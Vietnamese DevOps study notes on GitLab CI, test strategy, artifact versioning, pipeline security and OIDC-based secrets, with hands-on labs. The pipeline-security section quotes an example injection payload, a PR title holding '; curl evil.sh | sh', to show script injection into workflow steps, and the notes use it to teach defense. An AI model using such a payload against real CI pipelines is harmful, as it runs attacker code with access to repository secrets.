=== gitlab-others | Pipeline | GitLab CI và các công cụ khác
>> Nhiều nền tảng CI/CD có cùng mô hình với khác biệt cú pháp. Biết GitLab CI và bản đồ các công cụ giúp bạn chuyển đổi và chọn đúng khi cần.

## GitLab CI/CD

Pipeline định nghĩa trong `.gitlab-ci.yml` ở gốc repo. Job nhóm thành **stage**; các stage chạy tuần tự, job trong cùng stage chạy song song.

```
stages: [lint, test, build, deploy]

default:
  image: python:3.12-slim
  cache:
    key:
      files: [requirements.txt]
    paths: [.cache/pip]

variables:
  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"

workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

lint:
  stage: lint
  script:
    - pip install ruff
    - ruff check .

unit-test:
  stage: test
  needs: [lint]
  script:
    - pip install -r requirements.txt
    - pytest --junitxml=report.xml
  artifacts:
    when: always
    reports:
      junit: report.xml

build-image:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA" .
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

deploy-prod:
  stage: deploy
  environment:
    name: production
    url: https://app.example.com
  script:
    - ./deploy.sh production "$CI_COMMIT_SHA"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual            # chờ nhấn tay
  resource_group: production  # không cho hai lần triển khai chạy cùng lúc
```

Từ khoá chính:

| Từ khoá | Ý nghĩa |
|---|---|
| `stages`, `stage` | Thứ tự các nhóm job |
| `needs` | Chạy ngay khi job phụ thuộc xong, không đợi cả stage (tạo đồ thị DAG) |
| `rules` | Điều kiện chạy job (thay `only`/`except` cũ): `if`, `changes`, `when` |
| `workflow: rules` | Quyết định cả pipeline có được tạo không |
| `artifacts`, `cache` | Truyền kết quả giữa job; giữ phụ thuộc giữa các lần chạy |
| `environment` | Gắn job với môi trường, có theo dõi lịch sử triển khai |
| `extends`, `include`, `!reference` | Tái sử dụng cấu hình trong và giữa các repo |
| `variables` | Biến; biến nhạy cảm đặt trong phần CI/CD settings dạng **masked** và **protected** |
| `resource_group` | Tuần tự hoá các job cùng nhóm (tránh triển khai chồng nhau) |

Runner của GitLab có nhiều **executor** (shell, Docker, Kubernetes...). Với executor Docker và việc build image, có ba lựa chọn: Docker-in-Docker (cần chế độ privileged), gắn socket Docker của host (rủi ro bảo mật cao), hoặc công cụ build không cần daemon như Kaniko hay Buildah.

## So sánh nhanh

| | GitHub Actions | GitLab CI | Jenkins |
|---|---|---|---|
| Cấu hình | YAML trong `.github/workflows` | YAML `.gitlab-ci.yml` | `Jenkinsfile` (Groovy) |
| Hạ tầng | Hosted hoặc tự lưu trữ | Hosted hoặc tự lưu trữ | **Tự vận hành** controller và agent |
| Hệ sinh thái | Marketplace action rất lớn | Template, tích hợp chặt với DevOps platform của GitLab | Hàng nghìn plugin (cần bảo trì và vá lỗi) |
| Điểm mạnh | Gần mã nguồn GitHub, dễ bắt đầu | Một nền tảng cho mã, CI, registry, bảo mật | Linh hoạt tối đa, cài đặt on-prem |
| Điểm cần lưu ý | Bảo mật action bên thứ ba | Cấu hình runner/executor | Gánh nặng vận hành, nợ plugin |

## Bản đồ công cụ khác

| Công cụ | Ghi chú |
|---|---|
| **Jenkins** | Lâu đời, tự lưu trữ, rất linh hoạt; pipeline khai báo (`pipeline { agent ... stages ... }`) và thư viện dùng chung. Chi phí nằm ở vận hành và nâng cấp plugin |
| **CircleCI, Buildkite, Drone, Travis...** | CI dạng dịch vụ hoặc tự lưu trữ với mô hình tương tự |
| **Tekton, Argo Workflows** | Pipeline chạy **bên trong Kubernetes** như resource; phù hợp nền tảng nội bộ cloud-native |
| **Dagger** và các công cụ pipeline "portable" | Viết pipeline bằng mã, chạy giống hệt trên máy cá nhân và trên mọi CI |
| **Argo CD, Flux** | Không phải CI mà là **CD kiểu GitOps** cho Kubernetes ([GitOps](#gitops-cd)) |

## Tránh bị khoá vào một nền tảng

Một số thói quen giảm chi phí khi đổi công cụ:

- Đặt **logic thật** vào script trong repo (`make test`, `./scripts/build.sh`) hoặc công cụ như Dagger; file pipeline chỉ **gọi** chúng. Chạy được trên máy bạn bằng đúng lệnh mà CI chạy.
- Dùng `Makefile` hoặc task runner để thống nhất lệnh: `make lint`, `make test`, `make build`.
- Ghim phiên bản công cụ qua image hoặc tệp phiên bản, không phụ thuộc cấu hình ngầm của runner.

::: lab Đặt logic vào script, pipeline chỉ gọi
```
mkdir -p ~/ci-lab/scripts && cd ~/ci-lab
cat > Makefile <<'EOF'
.PHONY: lint test build ci
lint:
	@echo "lint ok"
test:
	@python3 -c "assert 2+2==4; print('test ok')"
build:
	@echo "build $$(git rev-parse --short HEAD 2>/dev/null || echo local)"
ci: lint test build
EOF
git init -q . 2>/dev/null; make ci
```
Sau đó viết cả hai: một workflow GitHub Actions và một `.gitlab-ci.yml`, mỗi cái chỉ chạy `make ci`. So sánh hai tệp: phần nào khác nhau, phần nào giống?
:::

=== testing-strategy | Pipeline | Chiến lược kiểm thử trong pipeline
>> Pipeline chỉ tốt bằng các bài kiểm thử trong nó. Chiến lược kiểm thử quyết định pipeline vừa nhanh vừa bắt được lỗi thật.

## Kim tự tháp kiểm thử

```ascii
          /\
         /  \        E2E / UI: ít, chậm, dễ vỡ, kiểm tra luồng người dùng thật
        /----\
       /      \      Tích hợp / API / contract: vừa phải, kiểm tra các phần nói chuyện với nhau
      /--------\
     /          \    Đơn vị: nhiều, nhanh, kiểm tra logic từng phần
    /____________\
```

| Tầng | Đặc điểm | Chạy khi nào |
|---|---|---|
| Đơn vị (unit) | Mili giây, không cần mạng hay database thật | Mọi commit |
| Tích hợp | Dùng database, hàng đợi thật (container) | Mọi PR, hoặc song song |
| Hợp đồng (contract) | Kiểm tra API giữa dịch vụ không bị phá vỡ (ví dụ Pact) | Khi đổi giao diện dịch vụ |
| End-to-end | Mô phỏng người dùng qua giao diện | Sau khi triển khai staging; số lượng nhỏ, tập trung vào luồng quan trọng |
| Smoke | Vài kiểm tra "dịch vụ còn sống" sau triển khai | Mỗi lần triển khai |
| Hiệu năng, tải | Đo độ trễ và công suất | Theo lịch, hoặc trước phát hành lớn |

Quy tắc: nhiều test nhanh ở dưới, ít test chậm ở trên. Pipeline "kim tự tháp ngược" (chủ yếu E2E) chậm, vỡ ngẫu nhiên và khó tìm nguyên nhân.

## Test không ổn định (flaky)

Test lúc đỏ lúc xanh không đổi mã là kẻ phá hoại niềm tin vào pipeline: người ta bắt đầu bấm "chạy lại" thay vì điều tra, rồi bỏ qua cả những lỗi thật.

- **Đo**: theo dõi test nào hay vỡ ngẫu nhiên (nhiều nền tảng có báo cáo), đừng chỉ dựa vào cảm giác.
- **Cách ly (quarantine)**: chuyển test flaky sang nhóm riêng không chặn pipeline, nhưng **có người chịu trách nhiệm sửa** và có hạn.
- **Nguyên nhân thường gặp**: phụ thuộc thứ tự chạy, thời gian (`sleep` cố định), dữ liệu dùng chung giữa test, dịch vụ ngoài, tài nguyên chạy song song tranh nhau. Sửa gốc thay vì thêm `retry`.
- Tự động chạy lại (retry) chỉ nên là biện pháp tạm, có ghi nhận mỗi lần retry.

## Dữ liệu và môi trường kiểm thử

- Dựng dịch vụ phụ thuộc bằng container ngay trong pipeline (`services` của Actions, Testcontainers) để môi trường kiểm thử giống nhau mọi nơi.
- Dữ liệu kiểm thử tạo trong chính test (hoặc fixture) và dọn sau; không dựa vào dữ liệu có sẵn trên môi trường dùng chung.
- Mỗi test độc lập: chạy theo thứ tự nào cũng được, chạy song song được.
- Không dùng dữ liệu production thật; nếu cần, ẩn danh trước.

## Cổng chất lượng (quality gate)

Điều kiện tối thiểu để một thay đổi được đi tiếp, ví dụ:

- Tất cả test bắt buộc qua; lint và định dạng đạt.
- Quét bảo mật không có lỗ hổng mức cao đã có bản vá.
- Độ phủ mã không giảm dưới ngưỡng thoả thuận.
- Có review từ ít nhất một người (bảo vệ nhánh).

**Độ phủ (coverage)** là chỉ số hữu ích để tìm chỗ **chưa có** kiểm thử, nhưng không chứng minh chất lượng test: phủ 90% mà không có assertion vẫn vô nghĩa. Đừng biến nó thành mục tiêu để chạy theo; kết hợp với review test và, khi cần, kiểm thử đột biến (mutation testing) để đo khả năng bắt lỗi thật.

## Tăng tốc mà không giảm chất lượng

- **Chia test thành nhiều job chạy song song** (sharding) theo thời gian chạy trước đó.
- **Chỉ chạy test liên quan** đến thay đổi (bộ lọc đường dẫn, phân tích phụ thuộc) trên PR; chạy đầy đủ trên nhánh chính.
- **Cache** phụ thuộc và kết quả build.
- Đưa test nhanh và quan trọng lên đầu để phản hồi sớm; test chậm chạy song song hoặc sau.

::: lab Đo thời gian và độ ổn định của bộ test
```
# với một dự án có test (ví dụ pytest)
for i in $(seq 1 5); do pytest -q --durations=5 -p no:cacheprovider 2>&1 | tail -3; done
pytest -q --durations=10                           # 10 test chậm nhất
pytest -q -p no:randomly -x                        # dừng ở lỗi đầu tiên
```
Ghi lại: bộ test chạy mất bao lâu? Test nào chậm nhất và liệu có thể chuyển xuống tầng thấp hơn? Có test nào kết quả không giống nhau giữa các lần chạy?
:::

=== artifacts | Pipeline | Artifact, phiên bản và phát hành
>> Artifact là sản phẩm của build (image, gói, tệp nhị phân). Cách bạn đặt phiên bản, lưu trữ và truy ngược artifact quyết định việc triển khai có đáng tin cậy và quay lui được hay không.

## Build một lần, triển khai nhiều nơi

Artifact được tạo **một lần** trong pipeline rồi đi qua dev, staging, production. Không build lại cho từng môi trường: build lại có thể cho kết quả khác (phụ thuộc đổi, thời gian) nên thứ bạn kiểm thử ở staging không còn là thứ chạy ở production.

```ascii
   commit --> build ONE image (tag: git SHA) --> push registry
                                                     |
                      +------------------------------+------------------------------+
                      v                              v                              v
                  deploy dev                   deploy staging                  deploy prod
                (cùng image, config khác)   (cùng image, config khác)       (cùng image, config khác)
```

Khác biệt giữa môi trường nằm ở **cấu hình** (biến môi trường, ConfigMap, Secret), không nằm trong artifact.

## Đặt phiên bản

**Semantic Versioning** (`MAJOR.MINOR.PATCH`): tăng MAJOR khi thay đổi phá vỡ tương thích, MINOR khi thêm tính năng tương thích, PATCH khi sửa lỗi.

| Định danh | Dùng để |
|---|---|
| **Git SHA** (`3f1a9c2`) | Truy ngược chính xác commit; tag chính cho mọi artifact CI sinh ra |
| **Semver** (`1.4.2`) | Phát hành chính thức; gắn với tag Git `v1.4.2` |
| Tag di động (`main`, `1.4`) | Tiện cho người dùng, **không** dùng để triển khai production |
| **Digest** (`sha256:...`) | Bất biến tuyệt đối; dùng khi triển khai |
| `latest` | Tránh dùng để triển khai |

Quy tắc: **mọi artifact truy ngược được tới commit và pipeline**. Gắn metadata: nhãn OCI (`org.opencontainers.image.revision`, `.source`, `.version`), và ghi lại digest trong bản ghi triển khai.

## Phiên bản tự động từ commit

**Conventional Commits** quy ước thông điệp commit có tiền tố: `feat:` (tính năng, tăng MINOR), `fix:` (sửa lỗi, tăng PATCH), `feat!:` hoặc `BREAKING CHANGE:` (tăng MAJOR), và `docs:`, `chore:`, `refactor:`... Công cụ như `semantic-release` hoặc `release-please` đọc lịch sử commit để **tự tính phiên bản kế tiếp, tạo tag, changelog và release**:

```
feat(api): thêm tham số lọc theo ngày
fix(auth): sửa lỗi hết hạn token sớm
feat(api)!: đổi định dạng phản hồi của /orders
```

Cách này làm việc phát hành lặp lại được và giảm tranh cãi "nên là phiên bản mấy", nhưng đòi hỏi cả nhóm viết commit theo quy ước (có thể kiểm tra bằng công cụ lint commit trong CI).

## Lưu trữ artifact

| Loại | Nơi lưu |
|---|---|
| Container image | Registry OCI (GHCR, ECR, Harbor...): xem [Registry](https://tracviethustcs.github.io/docker-container-notes/#registry) |
| Gói thư viện | npm, PyPI, Maven, NuGet (kho riêng hoặc công cộng) |
| Tệp nhị phân, bản phát hành | Kho artifact (Artifactory, Nexus), release của Git, bucket đối tượng |
| Biểu đồ Helm | Registry OCI hoặc kho chart |

Cần có **chính sách giữ lại** (retention): xoá artifact cũ theo tuổi, nhưng **giữ** mọi bản đã từng phát hành production để quay lui và truy vết. Tách kho cho artifact tạm của CI và kho cho bản phát hành.

## Xuất bản kèm bằng chứng

Artifact đáng tin cậy khi biết nó đến từ đâu và chứa gì:

- **SBOM** (danh sách thành phần), **chữ ký** (cosign) và **chứng thực nguồn gốc (provenance)** ghi lại commit, pipeline và người build. Khung SLSA định nghĩa các mức bảo đảm cho chuỗi cung ứng.
- Môi trường triển khai (hoặc policy engine như Kyverno) **xác minh** chữ ký trước khi chạy.

Xem chi tiết kỹ thuật ở [Bảo mật chuỗi cung ứng image](https://tracviethustcs.github.io/k8s-study-notes/#adv-supply-chain) và [Bảo mật pipeline](#pipeline-security).

## Promotion: nâng cấp artifact, không build lại

Đưa một bản lên môi trường kế tiếp nghĩa là **chỉ định artifact đã có** cho môi trường đó (đổi tag/digest trong cấu hình hoặc repo GitOps), không phải build lại. "Promotion" có thể là gắn thêm tag (`1.4.2` đã qua staging), hoặc cập nhật tham chiếu trong repo cấu hình ([GitOps](#gitops-cd)).

::: lab Tag theo SHA và theo semver từ cùng một image
```
mkdir -p ~/art && cd ~/art && git init -q . && printf 'FROM alpine:3.20\nCMD ["echo","xin chào"]\n' > Dockerfile
git add . && git -c user.name=t -c user.email=t@t commit -qm "feat: bản đầu"
SHA=$(git rev-parse --short HEAD)
docker build -q -t demo:$SHA --label org.opencontainers.image.revision=$(git rev-parse HEAD) .
docker tag demo:$SHA demo:1.0.0                      # semver trỏ tới CÙNG một image, không build lại
docker image ls demo; docker image ls --digests demo
docker inspect -f '{{index .Config.Labels "org.opencontainers.image.revision"}}' demo:1.0.0
```
Quan sát: hai tag có cùng IMAGE ID/digest không? Từ image đang chạy, bạn truy ngược về commit nào bằng cách nào?
:::

=== pipeline-security | An toàn | Bảo mật pipeline (DevSecOps)
>> Pipeline có quyền sâu: đọc mã, giữ bí mật, đẩy artifact và triển khai production. Kẻ tấn công chiếm được pipeline thì chiếm được mọi thứ phía sau. Bảo mật pipeline gồm hai phần: kiểm tra bảo mật **trong** pipeline và bảo vệ **chính** pipeline.

## Kiểm tra bảo mật trong pipeline

| Loại | Tìm gì | Công cụ phổ biến | Khi nào |
|---|---|---|---|
| **Quét bí mật** | Khoá, token lỡ commit | gitleaks, trufflehog | Trước commit (pre-commit) và mỗi PR |
| **SAST** | Lỗ hổng trong mã nguồn (SQL injection, XSS...) | CodeQL, Semgrep, SonarQube | Mỗi PR |
| **SCA / quét phụ thuộc** | Thư viện có CVE đã biết, giấy phép | Dependabot, Renovate, Trivy, OWASP Dependency-Check, `npm audit`, `pip-audit` | Mỗi PR và theo lịch |
| **Quét image** | CVE trong image nền và thư viện hệ thống | Trivy, Grype | Sau build, và định kỳ trên registry |
| **Quét IaC** | Cấu hình hạ tầng sai (bucket công khai, SG mở) | Trivy config, Checkov, tfsec | Mỗi PR có thay đổi hạ tầng |
| **DAST** | Lỗ hổng khi ứng dụng đang chạy | OWASP ZAP | Sau triển khai staging |
| **SBOM** | Danh sách thành phần để tra cứu khi có CVE mới | Syft | Mỗi bản phát hành |

Nguyên tắc: bắt đầu bằng ngưỡng **chặn** thực tế (ví dụ chặn lỗ hổng mức cao đã có bản vá), không phải "chặn tất cả": quá nhiều cảnh báo nhiễu khiến người ta tắt công cụ. Ghi nhận ngoại lệ có thời hạn và người chịu trách nhiệm.

## Bảo vệ chính pipeline

### Quyền tối thiểu

- Token của pipeline chỉ có quyền cần thiết: trong GitHub Actions đặt `permissions: contents: read` làm mặc định, mở thêm ở job cần.
- Thông tin xác thực cloud **ngắn hạn qua OIDC**, vai trò riêng cho từng môi trường ([Bí mật và OIDC](#secrets-oidc)).
- Production chỉ triển khai được từ nhánh chính và qua môi trường có **bắt buộc duyệt**.

### Chuỗi cung ứng của chính pipeline

- **Ghim action và template theo mã băm commit**, không dùng tag di động: `uses: actions/checkout@<sha đầy đủ>`. Tag của một action bên thứ ba có thể bị đổi sang mã độc. Dùng Renovate hoặc Dependabot để cập nhật các mã băm có kiểm soát.
- Cân nhắc **allowlist** các action được phép dùng trong tổ chức.
- Đọc mã của action/orb/plugin trước khi dùng nếu nó chạm tới bí mật hay quyền ghi.
- Ghim phiên bản công cụ build và image nền.

### Dữ liệu không đáng tin trong pipeline

Tên nhánh, tiêu đề PR, nội dung commit, tên file đều do người khác kiểm soát. Đưa thẳng vào lệnh shell là **chèn script (script injection)**:

```
# NGUY HIỂM: tiêu đề PR có thể chứa lệnh, ví dụ  "; curl evil.sh | sh #
- run: echo "PR: ${{ github.event.pull_request.title }}"

# AN TOÀN hơn: truyền qua biến môi trường rồi dùng như dữ liệu
- run: echo "PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

### Pull request từ bên ngoài

- PR từ **fork** không được truy cập bí mật mặc định; giữ nguyên như vậy.
- `pull_request_target` (GitHub) chạy với bí mật và quyền ghi của repo đích: **không bao giờ** checkout rồi chạy mã của PR trong workflow đó.
- Với repo công khai, yêu cầu người duyệt cho workflow chạy lần đầu của người đóng góp mới.

### Runner

- Runner tự lưu trữ nên **tạm thời** (mỗi job một máy sạch) và đặt trong mạng tách biệt; đừng để chúng tự do truy cập nội bộ.
- Đừng chạy runner tự lưu trữ cho repo công khai nhận PR từ bên ngoài.
- Với Docker trên runner: tránh gắn `docker.sock` hoặc chế độ privileged; ưu tiên Kaniko, Buildah hoặc BuildKit rootless.

## Bằng chứng nguồn gốc (provenance)

Khi build, sinh **SBOM** và **chứng thực nguồn gốc** (build từ commit nào, bởi pipeline nào), ký image bằng cosign, và ở phía triển khai **xác minh** chữ ký (Kyverno, policy-controller). Khung **SLSA** mô tả các mức bảo đảm: từ "có ghi lại provenance" đến "build không thể bị giả mạo". Ví dụ kỹ thuật ở [Bảo mật chuỗi cung ứng image](https://tracviethustcs.github.io/k8s-study-notes/#adv-supply-chain).

## Danh sách rà soát pipeline

| Câu hỏi | Mong muốn |
|---|---|
| Token mặc định có quyền ghi không? | Chỉ đọc, mở thêm khi cần |
| Có khoá cloud dài hạn trong biến CI không? | Không: dùng OIDC |
| Action bên thứ ba ghim theo mã băm chưa? | Rồi |
| Dữ liệu từ PR có đi thẳng vào `run:` không? | Không: qua biến môi trường |
| PR từ fork có chạm bí mật không? | Không |
| Runner tự lưu trữ có tạm thời không? | Có |
| Triển khai production cần ai duyệt? | Có người duyệt, nhánh chính |
| Có quét bí mật, phụ thuộc, image, IaC không? | Có, với ngưỡng chặn rõ |

::: lab Rà soát một workflow có sẵn
Lấy một workflow trong repo của bạn và đối chiếu bảng rà soát ở trên. Cụ thể:
```
grep -n "uses:" .github/workflows/*.yml                    # action nào đang dùng, ghim thế nào?
grep -n "permissions" .github/workflows/*.yml              # đã đặt quyền tối thiểu chưa?
grep -n '\${{ github.event' .github/workflows/*.yml        # có chèn dữ liệu người dùng vào run: không?
grep -n "pull_request_target" .github/workflows/*.yml
gitleaks detect --source . 2>/dev/null || echo "(cài gitleaks để quét bí mật)"
```
Liệt kê ba rủi ro lớn nhất bạn tìm được và cách sửa mỗi cái.
:::

=== secrets-oidc | An toàn | Bí mật và OIDC
>> Bí mật dài hạn nằm trong biến CI là mục tiêu bị đánh cắp hấp dẫn. Liên kết danh tính (OIDC) cho phép pipeline nhận quyền ngắn hạn mà không lưu khoá nào.

## Vấn đề của khoá dài hạn

Cách quen thuộc: tạo một người dùng IAM với khoá truy cập, dán vào secret của CI. Rủi ro: khoá không hết hạn, ai đọc được secret (hoặc làm lộ log) đều dùng được từ bất kỳ đâu, thường có quyền rộng và hiếm khi được xoay vòng.

## OIDC: nhận quyền ngắn hạn theo danh tính

Với OIDC, nền tảng CI (GitHub, GitLab) phát hành một **token định danh ngắn hạn** cho mỗi lần chạy job, chứa thông tin về repo, nhánh, môi trường. Cloud được cấu hình **tin** nhà phát hành token đó và chỉ cấp quyền khi token khớp điều kiện bạn đặt.

```ascii
   Job chạy  --(1) xin token OIDC-->  GitHub (nhà phát hành)
      |                                  |
      |<----- token: repo=org/app, ref=main, env=production ------+
      |
      +--(2) đưa token cho cloud (AssumeRoleWithWebIdentity)--> AWS
                                                                 |  kiểm tra: tin issuer? khớp sub?
      <------(3) thông tin xác thực TẠM THỜI (hết hạn sau ~1 giờ) +
      |
      +--(4) dùng quyền tạm để triển khai
```

Trên AWS, vai trò IAM có **trust policy** giới hạn danh tính được assume:

```
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::111111111111:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
      "StringLike":   {"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"}
    }
  }]
}
```

Điều kiện `sub` là chỗ **quan trọng nhất**: nó giới hạn đúng repo và nhánh (hoặc môi trường) được phép. Một điều kiện quá rộng (`repo:myorg/*`) cho phép mọi repo trong tổ chức dùng vai trò đó.

Workflow tương ứng:

```
permissions:
  id-token: write            # cho phép job xin token OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111111111111:role/gha-deploy-prod
          aws-region: ap-southeast-1
      - run: aws sts get-caller-identity
```

Azure, GCP, Vault và nhiều dịch vụ khác cũng hỗ trợ liên kết danh tính tương tự. GitLab phát hành token qua `id_tokens:`.

## Khi vẫn cần bí mật

Một số thứ không có OIDC (khoá API của dịch vụ bên thứ ba, mật khẩu). Quy tắc:

| Việc | Cách làm |
|---|---|
| Lưu | Trong kho bí mật của nền tảng CI hoặc Vault; **không** trong mã, `.env` đã commit, hay image |
| Phạm vi | Bí mật **theo môi trường** (production chỉ có ở môi trường production có duyệt), không dùng chung toàn repo |
| Quyền | Mỗi bí mật có quyền tối thiểu; một khoá cho một mục đích |
| Log | Che giá trị (masking); không `echo` biến môi trường; không bật chế độ debug chi tiết khi có bí mật |
| Xoay vòng | Đặt lịch xoay vòng; có quy trình khi nghi lộ: xoay vòng **ngay** |
| PR từ fork | Không truyền bí mật cho workflow của PR từ bên ngoài |

Đưa bí mật vào ứng dụng lúc **chạy** (Secret của Kubernetes từ Vault bằng Vault Secrets Operator, [xem](https://tracviethustcs.github.io/k8s-study-notes/#tool-secrets)) thay vì để pipeline giữ bí mật của ứng dụng và truyền vào lúc triển khai.

## Phát hiện và ứng phó khi lộ

- Quét bí mật trước khi commit và trong CI (gitleaks, trufflehog), và bật tính năng quét bí mật của nền tảng.
- Nếu bí mật đã bị commit: **coi như đã lộ**, xoay vòng ngay. Xoá khỏi lịch sử Git chỉ là bước dọn dẹp sau, không thay thế việc xoay vòng.
- Giám sát nhật ký truy cập của cloud (CloudTrail) cho hoạt động bất thường của danh tính pipeline.

::: lab Thiết kế trust policy cho hai môi trường
Không cần cloud thật: viết ra (trên giấy hoặc tệp JSON) hai trust policy cho hai vai trò:

1. `deploy-stg`: cho phép workflow từ nhánh `main` của repo `myorg/myapp` (môi trường `staging`) assume.
2. `deploy-prod`: chỉ cho phép khi workflow chạy trong môi trường `production` (điều kiện `sub` dạng `repo:myorg/myapp:environment:production`).

Với mỗi policy, trả lời: nếu ai đó tạo một nhánh mới tên `evil` và sửa workflow, họ có assume được vai trò không? Điều kiện nào ngăn việc đó?
:::
